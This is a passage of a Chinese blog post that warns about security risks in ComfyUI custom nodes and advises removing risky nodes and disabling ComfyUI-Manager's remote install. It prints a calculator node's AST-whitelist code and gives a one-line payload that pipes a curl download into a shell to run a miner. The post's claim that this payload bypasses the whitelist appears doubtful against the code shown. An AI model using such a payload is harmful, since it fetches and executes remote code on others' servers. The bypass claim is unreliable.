io.Latent.Input(<span class="string">&quot;latent&quot;</span>, optional=<span class="literal">True</span>, tooltip=<span class="string">&quot;Optional latent input to get input shape for LTX2 audio/video separation&quot;</span>),</span><br><span class="line">                io.Int.Input(<span class="string">&quot;seed&quot;</span>, default=<span class="number">0</span>, <span class="built_in">min</span>=<span class="number">0</span>, <span class="built_in">max</span>=<span class="number">0xffffffffffffffff</span>, step=<span class="number">1</span>, tooltip=<span class="string">&quot;Seed for stochastic sampling&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            outputs=[io.Sampler.Output()]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">cls, input_mode, certain_percentage, uncertainty_threshold, seed, verbose, latent=<span class="literal">None</span></span>) -&gt; io.NodeOutput:</span><br><span class="line">        video_shape = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> latent <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            video_shape = latent[<span class="string">&quot;samples&quot;</span>].shape</span><br><span class="line"></span><br><span class="line">        range_keys = <span class="built_in">sorted</span>([k <span class="keyword">for</span> k <span class="keyword">in</span> input_mode.keys() <span class="keyword">if</span> k.startswith(<span class="string">&#x27;start_step&#x27;</span>)])</span><br><span class="line">        stochastic_step_map = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;stochastic_plan&quot;</span> <span class="keyword">in</span> input_mode:</span><br><span class="line">            <span class="comment"># Parse manual string format: &quot;2-5:3,6-14:1&quot;</span></span><br><span class="line">            plan_str = input_mode[<span class="string">&quot;stochastic_plan&quot;</span>]</span><br><span class="line">            ranges = plan_str.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> range_spec <span class="keyword">in</span> ranges:</span><br><span class="line">                range_spec = range_spec.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> range_spec:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    range_part, steps_part = range_spec.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">                    start, end = range_part.split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">                    start, end, steps = <span class="built_in">int</span>(start), <span class="built_in">int</span>(end), <span class="built_in">int</span>(steps_part)</span><br><span class="line">                    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">                        stochastic_step_map[idx] = steps</span><br><span class="line">                <span class="keyword">except</span> ValueError:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Invalid format in stochastic_plan: &#x27;<span class="subst">&#123;range_spec&#125;</span>&#x27;. Expected format: &#x27;start-end:steps&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            range_keys = [k <span class="keyword">for</span> k <span class="keyword">in</span> input_mode.keys() <span class="keyword">if</span> k.startswith(<span class="string">&#x27;start_step&#x27;</span>)]</span><br><span class="line">            <span class="keyword">for</span> start_key <span class="keyword">in</span> range_keys:</span><br><span class="line">                i = start_key.replace(<span class="string">&#x27;start_step&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                start = input_mode.get(<span class="string">f&quot;start_step<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">                end = input_mode.get(<span class="string">f&quot;end_step<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">                steps = input_mode.get(<span class="string">f&quot;steps_<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> start <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> end <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> steps <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">                        stochastic_step_map[idx] = steps</span><br><span class="line"></span><br><span class="line">        sampler = KSAMPLER(sample_selfrefinevideo, &#123;</span><br><span class="line">            <span class="string">&quot;stochastic_step_map&quot;</span>: stochastic_step_map,</span><br><span class="line">            <span class="string">&quot;certain_percentage&quot;</span>: certain_percentage,</span><br><span class="line">            <span class="string">&quot;uncertainty_threshold&quot;</span>: uncertainty_threshold,</span><br><span class="line">            <span class="string">&quot;verbose&quot;</span>: verbose,</span><br><span class="line">            <span class="string">&quot;video_shape&quot;</span>: video_shape,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> io.NodeOutput(sampler)</span><br></pre></td></tr></table></figure>
+<p>&emsp;这个节点本身不直接执行代码，但是可以控制采样步骤、循环执行任务、后台持续运行，并且不占界面，黑客可以循环调用挖矿脚本。</p>
+<ul>
+<li>(2) 节点<code>SimpleCalculatorKJ</code></li>
+</ul>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">class</span> <span class="title class_">SimpleCalculatorKJ</span>(io.ComfyNode):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">define_schema</span>(<span class="params">cls</span>):</span><br><span class="line">        template = io.Autogrow.TemplateNames(<span class="built_in">input</span>=io.MultiType.Input(<span class="string">&quot;var&quot;</span>, [io.Int, io.Float, io.Boolean], optional=<span class="literal">True</span>), names=[<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>], <span class="built_in">min</span>=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> io.Schema(</span><br><span class="line">            node_id=<span class="string">&quot;SimpleCalculatorKJ&quot;</span>,</span><br><span class="line">            category=<span class="string">&quot;KJNodes/misc&quot;</span>,</span><br><span class="line">            description=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Calculator node that evaluates a mathematical expression using inputs a and b.  </span></span><br><span class="line"><span class="string">    Supported operations: +, -, *, /, //, %, **, &lt;&lt;, &gt;&gt;, unary +/-  </span></span><br><span class="line"><span class="string">    Supported comparisons: ==, !=, &lt;, &lt;=, &gt;, &gt;=  </span></span><br><span class="line"><span class="string">    Supported logic: and, or, not  </span></span><br><span class="line"><span class="string">    Supported functions: abs(), round(), min(), max(), pow(), sqrt(), sin(), cos(), tan(), log(), log10(), exp(), floor(), ceil()  </span></span><br><span class="line"><span class="string">    Supported constants: pi, euler, True, False  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,</span><br><span class="line">            search_aliases=[<span class="string">&quot;math&quot;</span>, <span class="string">&quot;arithmetic&quot;</span>, <span class="string">&quot;expression&quot;</span>, <span class="string">&quot;logic&quot;</span>],</span><br><span class="line">            inputs=[</span><br><span class="line">                io.String.Input(<span class="string">&quot;expression&quot;</span>, default=<span class="string">&quot;a + b&quot;</span>, multiline=<span class="literal">True</span>),</span><br><span class="line">                io.Autogrow.Input(<span class="string">&quot;variables&quot;</span>, template=template),</span><br><span class="line">            ],</span><br><span class="line">            outputs=[</span><br><span class="line">                io.Float.Output(),</span><br><span class="line">                io.Int.Output(),</span><br><span class="line">                io.Boolean.Output(),</span><br><span class="line">            ],</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">cls, variables, expression, a=<span class="literal">None</span>, b=<span class="literal">None</span></span>) -&gt; io.NodeOutput:</span><br><span class="line">        <span class="keyword">import</span> ast</span><br><span class="line">        <span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Allowed operations</span></span><br><span class="line">        allowed_operators = &#123;</span><br><span class="line">            ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv,</span><br><span class="line">            ast.FloorDiv: operator.floordiv, ast.Mod: operator.mod, ast.Pow: operator.<span class="built_in">pow</span>, </span><br><span class="line">            ast.USub: operator.neg, ast.UAdd: operator.pos, ast.LShift: operator.lshift, </span><br><span class="line">            ast.RShift: operator.rshift, ast.Eq: operator.eq, ast.NotEq: operator.ne, ast.Lt: operator.lt,</span><br><span class="line">            ast.LtE: operator.le, ast.Gt: operator.gt, ast.GtE: operator.ge, ast.And: operator.and_, </span><br><span class="line">            ast.Or: operator.or_, ast.Not: operator.not_,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Allowed functions</span></span><br><span class="line">        allowed_functions = &#123;</span><br><span class="line">            <span class="string">&#x27;abs&#x27;</span>: <span class="built_in">abs</span>, <span class="string">&#x27;round&#x27;</span>: <span class="built_in">round</span>, <span class="string">&#x27;min&#x27;</span>: <span class="built_in">min</span>, <span class="string">&#x27;max&#x27;</span>: <span class="built_in">max</span>,</span><br><span class="line">            <span class="string">&#x27;pow&#x27;</span>: <span class="built_in">pow</span>, <span class="string">&#x27;sqrt&#x27;</span>: math.sqrt, <span class="string">&#x27;sin&#x27;</span>: math.sin,</span><br><span class="line">            <span class="string">&#x27;cos&#x27;</span>: math.cos, <span class="string">&#x27;tan&#x27;</span>: math.tan, <span class="string">&#x27;log&#x27;</span>: math.log,</span><br><span class="line">            <span class="string">&#x27;log10&#x27;</span>: math.log10, <span class="string">&#x27;exp&#x27;</span>: math.exp, <span class="string">&#x27;floor&#x27;</span>: math.floor,</span><br><span class="line">            <span class="string">&#x27;ceil&#x27;</span>: math.ceil</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Allowed constants - start with pi, e, True, False</span></span><br><span class="line">        allowed_names = &#123;<span class="string">&#x27;pi&#x27;</span>: math.pi, <span class="string">&#x27;euler&#x27;</span>: math.e, <span class="string">&#x27;True&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;False&#x27;</span>: <span class="literal">False</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add all variables from autogrow to allowed_names</span></span><br><span class="line">        <span class="keyword">for</span> var_name, var_value <span class="keyword">in</span> variables.items():</span><br><span class="line">            allowed_names[var_name] = var_value</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Backwards compatibility: add a and b if they&#x27;re provided (for old workflows)</span></span><br><span class="line">        <span class="keyword">if</span> a <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            allowed_names[<span class="string">&#x27;a&#x27;</span>] = a</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            allowed_names[<span class="string">&#x27;b&#x27;</span>] = b</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">eval_node</span>(<span class="params">node</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Constant):  <span class="comment"># Numbers and booleans</span></span><br><span class="line">                <span class="keyword">return</span> node.value</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.Name):  <span class="comment"># Variables</span></span><br><span class="line">                <span class="keyword">if</span> node.<span class="built_in">id</span> <span class="keyword">in</span> allowed_names:</span><br><span class="line">                    <span class="keyword">return</span> allowed_names[node.<span class="built_in">id</span>]</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Name &#x27;<span class="subst">&#123;node.<span class="built_in">id</span>&#125;</span>&#x27; is not allowed&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.BinOp):  <span class="comment"># Binary operations</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(node.op) <span class="keyword">not</span> <span class="keyword">in</span> allowed_operators:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Operator <span class="subst">&#123;<span class="built_in">type</span>(node.op).__name__&#125;</span> is not allowed&quot;</span>)</span><br><span class="line">                left = eval_node(node.left)</span><br><span class="line">                right = eval_node(node.right)</span><br><span class="line">                <span class="keyword">return</span> allowed_operators[<span class="built_in">type</span>(node.op)](left, right)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.UnaryOp):  <span class="comment"># Unary operations</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(node.op) <span class="keyword">not</span> <span class="keyword">in</span> allowed_operators:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Operator <span class="subst">&#123;<span class="built_in">type</span>(node.op).__name__&#125;</span> is not allowed&quot;</span>)</span><br><span class="line">                operand = eval_node(node.operand)</span><br><span class="line">                <span class="keyword">return</span> allowed_operators[<span class="built_in">type</span>(node.op)](operand)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.Compare):  <span class="comment"># Comparison operations</span></span><br><span class="line">                left = eval_node(node.left)</span><br><span class="line">                <span class="keyword">for</span> op, comparator <span class="keyword">in</span> <span class="built_in">zip</span>(node.ops, node.comparators):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(op) <span class="keyword">not</span> <span class="keyword">in</span> allowed_operators:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Operator <span class="subst">&#123;<span class="built_in">type</span>(op).__name__&#125;</span> is not allowed&quot;</span>)</span><br><span class="line">                    right = eval_node(comparator)</span><br><span class="line">                    result = allowed_operators[<span class="built_in">type</span>(op)](left, right)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    left = right</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.BoolOp):  <span class="comment"># Boolean operations (and, or)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(node.op) <span class="keyword">not</span> <span class="keyword">in</span> allowed_operators:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Operator <span class="subst">&#123;<span class="built_in">type</span>(node.op).__name__&#125;</span> is not allowed&quot;</span>)</span><br><span class="line">                values = [eval_node(value) <span class="keyword">for</span> value <span class="keyword">in</span> node.values]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.op, ast.And):</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">all</span>(values)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node.op, ast.Or):</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">any</span>(values)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.Call):  <span class="comment"># Function calls</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(node.func, ast.Name):</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Only simple function calls are allowed&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> node.func.<span class="built_in">id</span> <span class="keyword">not</span> <span class="keyword">in</span> allowed_functions:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Function &#x27;<span class="subst">&#123;node.func.<span class="built_in">id</span>&#125;</span>&#x27; is not allowed&quot;</span>)</span><br><span class="line">                args = [eval_node(arg) <span class="keyword">for</span> arg <span class="keyword">in</span> node.args]</span><br><span class="line">                <span class="keyword">return</span> allowed_functions[node.func.<span class="built_in">id</span>](*args)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Node type <span class="subst">&#123;<span class="built_in">type</span>(node).__name__&#125;</span> is not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tree = ast.parse(expression, mode=<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">            result = eval_node(tree.body)</span><br><span class="line">            <span class="keyword">return</span> io.NodeOutput(<span class="built_in">float</span>(result), <span class="built_in">int</span>(result), <span class="built_in">bool</span>(result))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">f&quot;CalculatorKJ Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> io.NodeOutput(<span class="number">0.0</span>, <span class="number">0</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p>&emsp;漏洞代码<code>eval_node</code>，它使用了AST解析+自定义白名单来执行数学表达式，但是白名单可以被绕过，黑客利用方式如下，只需要发一个prompt调用这个节点，就能下载挖矿程序、运行程序挖矿、持久化驻留并控制你的服务器。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl malware | sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>&emsp;如果一定要用这个插件，可以手动去删除掉这两个节点。</p>
+<h2 id="3-ComfyUI-Manager"><a href="#3-ComfyUI-Manager" class="headerlink" title="3.ComfyUI-Manager"></a>3.<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI-Manager">ComfyUI-Manager</a></h2><p>&emsp;远程可以通过prompt调用CmfyUI-Manager来自动下载节点，可以更改ComfyUI-Manager的配置：<code>/path/to/ComfyUI/user/_manager/config.ini</code>为如下配置，重启服务即可，避免黑客通过prompt的api远程调用这个插件安装莫名奇妙的其他插件。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_remote_access</span> = <span class="literal">False</span></span><br><span class="line"><span class="attr">allow_install_custom_nodes</span> = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-ComfyUI-Notebook"><a href="#4-ComfyUI-Notebook" class="headerlink" title="4.ComfyUI-Notebook"></a>4.<a target="_blank" rel="noopener" href="https://github.com/liusida/ComfyUI-Notebook">ComfyUI-Notebook</a></h2><p>&emsp;<code>Notebook:Cell</code>可以直接执行python代码</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ComfyUI/" rel="tag"># ComfyUI</a>
+              <a href="/tags/ComfyUI-Manager/" rel="tag"># ComfyUI-Manager</a>
+              <a href="/tags/srl-nodes/" rel="tag"># srl-nodes</a>
+              <a href="/tags/comfyui-kjnodes/" rel="tag"># comfyui-kjnodes</a>
+              <a href="/tags/ComfyUI-Notebook/" rel="tag"># ComfyUI-Notebook</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/13/ComfyUI%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E8%8A%82%E7%82%B9%E6%B7%BB%E5%8A%A0/" rel="prev" title="Comfyui学习笔记（三）：自定义节点添加">
+                  <i class="fa fa-angle-left"></i> Comfyui学习笔记（三）：自定义节点添加
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/04/04/Antigravity-Tools%E7%BB%93%E5%90%88Open-Code%E6%90%AD%E5%BB%BAVibe%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E7%AC%94%E8%AE%B0/" rel="next" title="Antigravity Tools结合Open Code搭建Vibe编程环境笔记">
+                  Antigravity Tools结合Open Code搭建Vibe编程环境笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">MirrorYuChen</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
